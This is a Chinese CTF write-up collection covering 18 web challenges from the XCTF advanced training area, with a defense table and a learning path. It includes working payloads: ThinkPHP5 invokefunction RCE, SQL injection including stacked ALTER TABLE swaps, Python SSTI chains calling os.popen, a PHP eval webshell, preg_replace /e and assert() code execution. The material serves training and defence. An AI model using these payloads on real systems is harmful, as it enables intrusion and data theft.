---
title: 攻防世界高手进阶区 Page1 全18题 Writeup 汇总
description: 攻防世界靶场高手进阶区第一页18道题目的完整解题报告，涵盖信息泄露、ThinkPHP5 RCE、文件包含绕过、SQL注入变种、JS逆向、PHP反序列化、文件上传、Python
  SSTI多引擎、Git泄露、preg_replace/e修饰符RCE等核心Web攻防技术点。
category: program-analysis
tags:
- 攻防世界
- CTF Writeup
- Web安全
- ThinkPHP5
- 文件包含
- SQL注入
- JavaScript逆向
- PHP反序列化
- 文件上传绕过
- SSTI模板注入
- Git源码泄露
- preg_replace RCE
- Tornado
- Flask
- 堆叠注入
date: 2021-10-01
updated: '2026-11-14'
---

## 概述

本页面整理自无名安全团队微信公众号归档文章，系统复现**攻防世界**靶场「高手进阶区」Page 1 全 18 道题目的解题思路与核心技术点。题目涵盖信息收集、框架漏洞利用、代码审计、模板注入、反序列化、文件上传、逻辑绕过等 Web 安全核心知识体系，适合 CTF 入门进阶与实战技能夯实。

> 交叉引用：[[ctfshow-web-info-gathering-brute-force]]（信息收集/源码泄露/爆破）、[[ctfshow-web-sql-injection-bypass-basics]]（SQL注入绕过基础）、[[ctfshow-php-command-execution-bypass-techniques]]（PHP命令执行/RCE绕过）、[[huxiangbei-willphp-file-inclusion-writeup]]（文件包含变量覆盖利用）、[[php-webshell-fundamentals-chopper-analysis]]（PHP Webshell原理与蚁剑连接）、[[vulnhub-bbs-cute-102-writeup]]（文件上传GIF89a绕过）、[[vulnhub-darkhole2-writeup]]（Git源码泄露审计）、[[crackme-analysis-keygen-development-case-study]]（JS逆向分析方法论）、[[reverse-engineering-beginner-learning-path]]（逆向学习路径）、[[0w1club-ctf-re-writeup-beginner-challenges]]（0w1Club RE题解体系）、[[edu-src-penetration-test-case-study]]（实战渗透测试案例）

---

## 题目清单与技术点映射

| # | 题目 | 核心技术点 | 难度 | 关键工具/Payload |
|---|------|------------|------|------------------|
| 1 | baby_web | 信息泄露、index.php 重定向抓包 | ★ | Burp Suite |
| 2 | Training-WWW-Robots | robots.txt 目录泄露 | ★ | 浏览器直接访问 |
| 3 | php_rce | ThinkPHP 5.x RCE (invokefunction) | ★★ | `call_user_func_array` 链 |
| 4 | Web_php_include | 文件包含绕过（大写绕过、data:// 伪协议） | ★★ | `str_replace` 绕过、`data://text/plain;base64,...` |
| 5 | ics-06 | ID 爆破/遍历 | ★★ | Burp Intruder |
| 6 | warmup | 源码泄露、双重 URL 编码绕过白名单 | ★★ | `%253F` 双编码 |
| 7 | NewsCenter | 联合查询 SQL 注入 | ★★ | `UNION SELECT` + `information_schema` |
| 8 | NaNNaNNaNNaN-Batman | JS 逆向、eval 动态执行、正则绕过 | ★★★ | Chrome DevTools `console.log` 替换 `eval` |
| 9 | PHP2 | `.phps` 源码泄露、双重 URL 编码 | ★★ | `%25%36%31...` (admin 双编码) |
| 10 | unserialize3 | PHP 反序列化、`__wakeup` 对象计数绕过 | ★★★ | `O:4:"xctf":3:{...}` 对象数不匹配 |
| 11 | upload1 | 前端验证绕过、图片马、蚁剑连接 | ★★ | Burp 改后缀、GIF89a 头 |
| 12 | Web_python_template_injection | Python SSTI (Jinja2/Mako/Tornado/Django)、`__class__.__mro__` 链 | ★★★ | `{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}` |
| 13 | Web_php_unserialize | PHP 反序列化、`preg_match` 数字绕过(`+`)、`__wakeup` 绕过、Base64 编码差异 | ★★★ | 本地 PHP 脚本生成精确 payload |
| 14 | supersqli | 堆叠注入、`ALTER TABLE RENAME` 表名/列名置换 | ★★★★ | `alter table words rename to caicaizi; alter table 1919... rename to words; alter table words change flag id varchar(100)` |
| 15 | easytornado | Tornado SSTI、`handler.settings` 泄露 `cookie_secret`、双重 MD5 签名 | ★★★★ | `{{handler.settings}}` → 计算 `md5(md5(filename) + cookie_secret)` |
| 16 | shrine | Flask SSTI 黑名单绕过(`(` `)` `config` `self`)、`url_for`/`get_flashed_messages` 内置对象利用 | ★★★★ | `{{url_for.__globals__['current_app'].config}}` |
| 17 | ics-05 | 文件包含(`php://filter` 读源码)、`preg_replace` `/e` 修饰符 RCE、`X-Forwarded-For` 伪造 | ★★★★ | `pattern=/.*/e&replacement=system('cat flag')&subject=test` + Header `X-Forwarded-For: 127.0.0.1` |
| 18 | mfw | Git 源码泄露、GitHack 还原、`assert()` RCE、`strpos` 绕过 | ★★★★ | `?page=flag') or system("cat templates/flag.php");//` |

---

## 详细题解

### baby_web —— 重定向抓包捕获 Flag

**考点**：HTTP 302 重定向导致 Flag 仅存在于响应体中，浏览器自动跳转导致不可见。

**解法**：
- 直接访问 `index.php` 触发跳转
- 使用 Burp Suite 拦截响应，在响应包中直接看到 Flag

> 关联：[[ctfshow-web-info-gathering-brute-force#源码泄露与版本控制残留]] 中抓包分析思想一致。

---

### Training-WWW-Robots —— robots.txt 敏感目录泄露

**考点**：Robots 协议泄露后台/隐藏目录。

**解法**：
- 直接访问 `/robots.txt`
- 发现 `Disallow: /flag/` 等敏感路径
- 访问泄露路径获取 Flag

> 防御参考：[[network-fundamentals-penetration-testing#网络拓扑与安全区域划分]] 中提到的敏感信息收集防护。

---

### php_rce —— ThinkPHP 5.x 远程代码执行

**考点**：ThinkPHP 5.0.x/5.1.x `invokefunction` 方法任意函数调用链。

**漏洞入口**：
```
/?s=index/thinkapp/invokefunction
```

**利用链**：
```
call_user_func_array → system / phpinfo / 任意函数
```

**核心 Payload**：
```http
# phpinfo()
?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

# 列出根目录
?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find%20/%20-name%20"*flag*"

# 读取 Flag
?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat</flag
```

> 同类框架漏洞：[[huxiangbei-willphp-file-inclusion-writeup]]（WillPHP 变量覆盖+文件包含）、[[vulnhub-sar-writeup]]（sar2HTML RCE）。

---

### Web_php_include —— 文件包含多种绕过姿势

**考点**：`str_replace` 过滤不彻底、伪协议利用。

#### 大写绕过
- 过滤代码：`str_replace('flag', '', $file)` 仅替换小写
- Payload：`/FlAg` 或 `/FLAg` 绕过过滤读取 Flag

#### data:// 伪协议
- 利用 `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+` 执行 PHP 代码
- 需要 `allow_url_include=On`

> 扩展：[[ctfshow-php-command-execution-bypass-techniques#伪协议与日志投毒]] 系统梳理了 `php://filter`、`data://`、`phar://` 等协议利用。

---

### ics-06 —— 报表中心 ID 遍历/爆破

**考点**：业务逻辑越权/ID 遍历。

**解法**：
- 只有“报表中心”按钮有响应
- 爆破 `id` 参数（如 `id=1`、`id=2`...）
- 在特定 ID 处返回 Flag

> 工具：Burp Intruder / Python 脚本批量请求。

---

### warmup —— 源码泄露 + 双重 URL 编码绕过

**考点**：
1. 右键查看源码发现 `source.php` 提示
2. 访问 `source.php` 看到 `hint.php` 代码
3. 白名单校验：`parse_url` 取 `?` 前部分，无 `?` 则自动补 `?`
4. 双重 URL 编码 `?` 绕过：`%253F`（`%`→`%25`，`?`→`%3F`）

**Payload**：
```
/hint.php?file=flag.php%253F
```
实际传入后端为 `flag.php?`，绕过白名单读取 Flag。

---

### NewsCenter —— 联合查询 SQL 注入

**考点**：标准 UNION 注入流程。

**注入点**：`id` 参数（数字型）。

**步骤**：
1. `1` 正常、`'` 报错 → 确认注入
2. `ORDER BY` 确定 3 列
3. `UNION SELECT 1,2,3` → 回显位 2、3
4. 查库：`UNION SELECT 1,2,group_concat(schema_name) FROM information_schema.schemata`
5. 查表：`UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='news'`
6. 查列：`UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema='news' AND table_name='secret_table'`
7. 取 Flag：`UNION SELECT 1,2,group_concat(id,'->',fl4g) FROM secret_table`

> 基础绕过技巧：[[ctfshow-web-sql-injection-bypass-basics#进制转换与位运算绕过]]、[[mysql-duplicate-entry-error-based-sqli]]（报错注入）、[[mysql-dnslog-injection-loadfile-unc]]（DNSLog 盲注）。

---

### NaNNaNNaNNaN-Batman —— JavaScript 逆向与正则绕过

**考点**：
- 前端 JS 混淆，`eval(_)` 执行动态代码
- 将 `eval` 改为 `console.log` 或 `alert` 还原逻辑
- 核心校验：输入 `e` 长度 16，以 `be0f23` 开头、`e98aa` 结尾，包含 `233ac`、`c7be9`
- 去重后 Flag 格式：`be0f23ac7be98aa`

**解法**：
1. 下载附件，浏览器打开
2. F12 控制台将 `eval` 替换：`eval = console.log`
3. 触发执行，控制台输出完整校验逻辑
4. 构造满足正则的字符串输入，或直接在控制台执行还原 Flag 的拼接代码

**还原 Flag 代码**：
```javascript
var t = ["fl", "s_a", "i", "e}"];
var n = ["a", "_h0l", "n"];
var r = ["g{", "e", "_0"];
var i = ["it'", "_", "n"];
var s = [t, n, r, i];
for (var o = 0; o < 13; ++o) {
    document.write(s[o % 4][0]);
    s[o % 4].splice(0, 1);
}
```

> 方法论参考：[[crackme-analysis-keygen-development-case-study#动态调试跟踪验证函数]]、[[0w1club-ctf-re-writeup-beginner-challenges#Android-APK-ELF-逆向]]。

---

### PHP2 —— `.phps` 源码泄露 + 双重 URL 编码

**考点**：
- 目录扫描发现 `index.phps`（Apache 配置不当解析为源码）
- 代码审计：`$_GET[urldecode(urldecode('admin'))]` 双重解码
- 构造 `admin` 双重 URL 编码：`%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45`（对应 `%61%64%6D%69%6E` → `admin`）

**Payload**：
```
/?id=%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45
```

---

### unserialize3 —— PHP 反序列化 `__wakeup` 绕过

**考点**：对象属性计数不匹配绕过 `__wakeup`。

**原理**：
- `unserialize()` 时先调用 `__wakeup()`
- 若序列化字符串中声明的属性数（`O:4:"xctf":1`）大于实际属性数，`__wakeup()` 不执行

**原始序列化**：
```
O:4:"xctf":1:{s:4:"flag";s:3:"111";}
```

**绕过 Payload**：
```
O:4:"xctf":3:{s:4:"flag";s:3:"111";}
```
将 `1` 改为 `3`（大于实际属性数 1），跳过 `__wakeup()` 直接反序列化，Flag 在对象销毁时 `__destruct()` 读取。

> 进阶：[[php-webshell-obfuscation-av-evasion]]（序列化混淆免杀）、[[race-condition-vulnerability-analysis]]（竞争条件与反序列化结合）。

---

### upload1 —— 文件上传前端绕过 + 图片马

**考点**：
- 前端 JS 仅校验后缀/MIME
- 抓包修改 `filename="shell.php"`、`Content-Type: image/gif`
- 注入 GIF89a 头 + PHP 代码：`GIF89a<?php @eval($_POST['cmd']);?>`
- 蚁剑连接获取 Flag

> 完整上传绕过体系：[[vulnhub-bbs-cute-102-writeup#GIF89a-头绕过]]、[[ctfshow-php-command-execution-bypass-techniques#文件上传与一句话木马]]、[[php-webshell-fundamentals-chopper-analysis#蚁剑流量分析]]。

---

### Web_python_template_injection —— Python SSTI 多引擎通杀

**考点**：服务端模板注入（SSTI），Jinja2/Mako/Tornado/Django 通用利用链。

**检测**：
```
{{7*7}} → 49 确认 SSTI
```

**核心利用链（Jinja2/Tornado）**：
```python
# 列出文件
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}

# 读取 Flag
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}

# 备选链 (catch_warnings → linecache → os)
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].popen('cat fl4g').read()}}
```

**自动化枚举脚本（Jinja2）**：
```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
{% for b in c.__init__.__globals__.values() %}
{% if b.__class__ == {}.__class__ %}
{% if 'eval' in b.keys() %}
{{b['eval']('__import__("os").popen("ls").read()')}}
{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}
```

> SSTI 系统总结：[[vulnhub-chronos-writeup#Node-js-原型链污染与-EJS-模板引擎-RCE]]（JS 模板引擎对比）、[[edu-src-penetration-test-case-study#存储型XSS与模板注入]]。

---

### Web_php_unserialize —— 反序列化综合绕过

**考点**：
1. `preg_match('/[0-9]/', $input)` 过滤数字 → `+` 号绕过：`O:+4:"Demo":2:{...}`
2. `__wakeup` 绕过：对象属性计数 `1` → `2`
3. 参数需 Base64 编码，**必须本地 PHP 生成**（在线工具常丢失空格/转义导致失败）

**本地生成脚本**：
```php
<?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) { $this->file = $file; }
    function __destruct() { echo @highlight_file($this->file, true); }
    function __wakeup() { if ($this->file != 'index.php') { $this->file = 'index.php'; } }
}
$obj = new Demo('fl4g.php');
$ser = serialize($obj);
$ser = str_replace('O:4', 'O:+4', $ser);  // 绕过数字正则
$ser = str_replace(':1:', ':2:', $ser);   // 绕过 wakeup
echo base64_encode($ser);
?>
```

> 实战经验：序列化 payload **务必本地生成**，避免编码差异导致利用失败。

---

### supersqli —— 堆叠注入 + 表名/列名置换

**考点**：
- 过滤：`select|update|delete|drop|insert|where|.` → 无法用常规 UNION/报错/盲注
- 堆叠注入（多语句执行）未被过滤
- 利用 `ALTER TABLE RENAME` 交换表名、`CHANGE` 修改列名，将含 Flag 的表伪装成正常查询表

**数据库结构**：
- 表 `1919810931114514`：列 `flag`
- 表 `words`：列 `id`、`data`（默认查询表）

**利用流程**：
```sql
1'; 
ALTER TABLE `words` RENAME TO `caicaizi`; 
ALTER TABLE `1919810931114514` RENAME TO `words`; 
ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100); 
#
```
执行后，原 Flag 表变为 `words` 且 Flag 列名变为 `id`，原查询 `SELECT id FROM words` 直接返回 Flag。

**最终 Payload**：
```
1';or'1'='1
```

> 变种思路：[[mongodb-nosql-injection-guide#数组注入与重言式绕过]]（NoSQL 逻辑绕过）、[[sqlmap-api-automation]]（自动化检测堆叠注入）。

---

### easytornado —— Tornado SSTI + Cookie Secret 窃取 + 双重 MD5

**考点**：
1. Tornado 模板注入点：`/error?msg={{...}}`
2. 通过 `handler.settings` 泄露 `cookie_secret`
3. Flag 文件名 `/fllllllllllllag`，需计算 `filehash = md5(md5(filename) + cookie_secret)`

**步骤**：
1. 确认 SSTI：`/error?msg={{8*8}}` → 64
2. 泄露配置：`/error?msg={{handler.settings}}` → 获取 `cookie_secret`
3. 计算：
   - `filename_md5 = md5('/fllllllllllllag')`
   - `filehash = md5(filename_md5 + cookie_secret)`
4. 请求：`/file?filename=/fllllllllllllag&filehash=<计算值>`

**Python 计算脚本**：
```python
import hashlib
cookie_secret = "泄露的值"
filename = "/fllllllllllllag"
f1 = hashlib.md5(filename.encode()).hexdigest()
filehash = hashlib.md5((f1 + cookie_secret).encode()).hexdigest()
print(filehash)
```

---

### shrine —— Flask SSTI 黑名单绕过 (`(` `)` `config` `self`)

**考点**：
- 黑名单：`(` `)` `config` `self` → 替换为空/None
- 过滤代码：`'{{% set {}=None %}}'.format(c)` 仅针对单词整体匹配
- 绕过：`current_app.config` 中 `config` 带前缀不匹配黑名单

**Payload**：
```jinja2
{{url_for.__globals__['current_app'].config}}
```
- `url_for` 内置函数 → `__globals__` 获取模块全局变量
- `current_app` 为 Flask 上下文代理对象 → `.config` 访问配置字典
- Flag 存储在 `app.config['FLAG']`（代码中 `app.config['FLAG'] = os.environ.pop('FLAG')`）

> 同类 Flask SSTI：[[vulnhub-chronos-writeup#Express-fileupload-原型链污染-RCE-利用-EJS-模板引擎]]（Node.js 对应利用）。

---

### ics-05 —— 文件包含读源码 + preg_replace /e 修饰符 RCE

**考点**：
1. `page` 参数文件包含 → `php://filter/read=convert.base64-encode/resource=index.php` 读源码
2. 源码逻辑：需 `X-Forwarded-For: 127.0.0.1` 头 + `preg_replace($pattern, $replacement, $subject)` 配合 `/e` 修饰符执行代码

**源码关键片段**：
```php
if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject); // /e 修饰符在 pattern 中
    }
}
```

**利用条件**：
- Header: `X-Forwarded-For: 127.0.0.1`
- GET 参数：
  - `pattern=/.*/e` （`/e` 使 replacement 作为 PHP 代码执行）
  - `replacement=system('cat flag')` （或 `phpinfo()`、`ls` 等）
  - `subject=test` （任意字符串触发匹配）

**完整请求**：
```
GET /?page=index.php&pattern=/.*/e&replacement=system('cat flag')&subject=test HTTP/1.1
X-Forwarded-For: 127.0.0.1
```

> `/e` 修饰符已废弃（PHP 5.5.0），但旧版本/遗留系统仍常见。参考：[[ctfshow-php-command-execution-bypass-techniques#assert-短标签闭合与正则替换执行]]。

---

### mfw —— Git 源码泄露 + assert() RCE + strpos 绕过

**考点**：
1. 目录扫描发现 `.git/` → GitHack 还原源码
2. `index.php` 核心代码：
```php
$file = "templates/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("file_exists('$file')") or die("That file doesn't exist!");
include $file;
```
3. `assert()` 将字符串作为 PHP 代码执行 → RCE
4. `strpos` 过滤 `..` → 单引号闭合 + 注释绕过

**Payload**：
```
?page=flag') or system("cat templates/flag.php");//
```
- 进入 `assert` 后拼接为：
  ```php
  strpos('templates/flag') or system("cat templates/flag.php");//.php', '..') === false
  ```
- `strpos` 返回 `false`（未找到 `..`），`or` 短路执行 `system()`
- `//` 注释掉后续代码

**工具链**：
- 目录扫描：dirsearch / yujian
- Git 还原：GitHack / git-dumper
- 代码审计：VS Code / php -l

> 实战案例：[[vulnhub-darkhole2-writeup#Git源码泄露审计获取凭证]]、[[edu-src-penetration-test-case-study#文件上传绕过Getshell]]。

---

## 技术点总结与知识图谱

### 核心漏洞类型覆盖

| 漏洞类型 | 涉及题目 | 关键利用姿势 |
|----------|----------|--------------|
| 信息泄露 | 1, 2, 6, 9 | 重定向抓包、robots.txt、源码备份文件(.phps)、双重编码绕过 |
| 框架已知漏洞 | 3 | ThinkPHP5 invokefunction RCE |
| 文件包含/读取 | 4, 12, 17 | 大写绕过、data://伪协议、php://filter读源码、SSTI读文件 |
| SQL注入 | 7, 14 | UNION查询、堆叠注入+ALTER TABLE置换 |
| 反序列化 | 10, 13 | __wakeup对象计数绕过、正则绕过(+号)、Base64编码本地生成 |
| 文件上传 | 11 | 前端校验绕过、图片马(GIF89a)、蚁剑连接 |
| 模板注入(SSTI) | 12, 15, 16 | Python(Jinja2/Tornado)__subclasses__链、Tornado handler.settings、Flask url_for.__globals__绕过黑名单 |
| 代码执行/RCE | 3, 8, 13, 14, 15, 17, 18 | call_user_func_array、eval/assert、preg_replace/e、堆叠注入system、SSTI os.popen |
| 逻辑/认证绕过 | 5, 6, 9, 14 | ID遍历、双重URL编码、表名列名置换 |
| 前端/JS逆向 | 8 | eval→console.log还原、正则分析构造 |
| 源码泄露审计 | 9, 18 | .phsw/.git泄露、GitHack还原、assert/strpos代码审计 |

### 工具与脚本清单

| 场景 | 推荐工具/脚本 |
|------|---------------|
| 抓包分析 | Burp Suite (Repeater/Intruder) |
| 目录/漏洞扫描 | dirsearch, yujian, GitHack, git-dumper |
| 编码/解码 | URL 多重编码、Base64、MD5 计算 (Python/在线) |
| 反序列化 Payload 生成 | 本地 PHP 脚本 (避免在线工具差异) |
| SSTI 自动化枚举 | tplmap, 自写 Jinja2/Tornado/Flask Payload 模板 |
| JS 逆向 | Chrome DevTools (Console/Sources)、美化插件 |
| Webshell 管理 | 蚁剑、Godzilla、Behinder |
| SQL 注入自动化 | sqlmap (API 模式: [[sqlmap-api-automation]]) |

---

## 防御与修复建议

| 漏洞类型 | 修固方案 |
|----------|----------|
| 信息泄露 | 禁用目录索引、移除 robots.txt 敏感路径、禁止 `.phps`/`.bak`/`.git` 等备份文件访问、重定向前校验权限 |
| ThinkPHP RCE | 升级至 5.1.41+/6.0+、禁用 `invokefunction` 等危险方法、开启强制路由 |
| 文件包含 | 避免动态 `include`、白名单校验、关闭 `allow_url_include`、禁用伪协议 |
| SQL 注入 | 全量参数化查询/PreparedStatement、严格输入校验、最小权限数据库账号、WAF 规则覆盖堆叠注入 |
| 反序列化 | 避免 `unserialize` 用户可控数据、改用 JSON、实现 `__wakeup` 严格校验、禁用危险魔术方法 |
| 文件上传 | 文件类型白名单(MIME+后缀+魔数)、重命名存储、上传目录不可执行、病毒扫描、Content-Type 强制 |
| SSTI | 模板引擎沙箱、禁用高危内置对象(`__globals__`/`__subclasses__`/`os`/`eval`)、CSP 策略、输入输出编码 |
| 代码执行 | 禁用 `eval/assert/preg_replace/e/create_function` 等危险函数、disable_functions、open_basedir 限制 |
| Git 泄露 | `.git` 加入 `.gitignore`/服务器配置拒绝访问、CI/CD 阶段剔除 `.git` 目录 |
| 前端逻辑校验 | 所有校验必须后端二次校验、敏感操作加 CSRF Token、避免前端加密/签名作为唯一防线 |

---

## 学习路径建议

1. **基础巩固**：[[ctfshow-web-info-gathering-brute-force]] → [[ctfshow-web-sql-injection-bypass-basics]] → [[ctfshow-php-command-execution-bypass-techniques]]
2. **框架漏洞**：ThinkPHP/Laravel/TP5/TP6/ThinkAdmin 等常用框架历史 CVE 复现
3. **反序列化进阶**：PHPGGC 生成链、Java/Gadgets、.NET/ysoserial.net、Python/pickle
4. **SSTI 专题**：Jinja2/Mako/Tornado/Django/Smarty/Twig/FreeMarker/Velocity/Thymeleaf 多引擎 Payload 收集
5. **代码审计实战**：[[vulnhub-darkhole2-writeup]]、[[edu-src-penetration-test-case-study]]、[[huxiangbei-willphp-file-inclusion-writeup]] 全流程复现
6. **JS 逆向工程**：[[crackme-analysis-keygen-development-case-study]]、[[0w1club-ctf-re-writeup-beginner-challenges]]、AST 还原混淆代码
7. **实战靶场**：攻防世界全区、VulnHub 系列([[vulnhub-platform-resource-index]])、HTB、TryHackMe、Buuctf

---

## 更新日志

| 版本 | 日期 | 变更内容 |
|------|------|----------|
| 1.0 | 2021-10-01 | 初版：整合 18 道题完整 Writeup，建立技术点索引与交叉引用 |
| 1.1 | 2024-01-15 | 补充防御建议、工具清单、学习路径；修正 Payload 格式；增加 SSTI 自动化枚举脚本 |

---

> 本页面基于无名安全团队微信公众号归档文章整理，旨在构建结构化、可检索、可复用的 CTF Web 攻防知识库。如发现技术细节偏差或遗漏，欢迎提交修正。

## 来源

- [0x00实验室-202108-202304_065](../sources/0x00实验室-202108-202304_065.md)
